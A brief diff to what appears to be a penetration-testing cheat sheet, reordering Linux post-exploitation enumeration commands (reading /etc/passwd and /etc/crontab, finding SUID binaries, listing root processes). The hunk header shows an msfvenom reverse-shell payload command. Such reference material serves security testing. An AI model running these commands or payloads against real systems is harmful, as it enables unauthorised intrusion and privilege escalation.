@@ -181,13 +181,13 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=$TARGET LPORT=$PORT -f elf -o rshe
 ```bash
 whoami
 uname -a
+cat /etc/passwd
+cat /etc/crontab
+find / -perm -u=s -type f 2> /dev/null
+ps aux | grep -v "\[" | grep root
 dpkg -l # debian
 rpm -qa # red hat
 pacman -Qe # arch
-cat /etc/passwd
-find / -perm -u=s -type f 2> /dev/null
-cat /etc/crontab
-ps aux | grep -v "\[" | grep root
 ```
 
 #### Windows
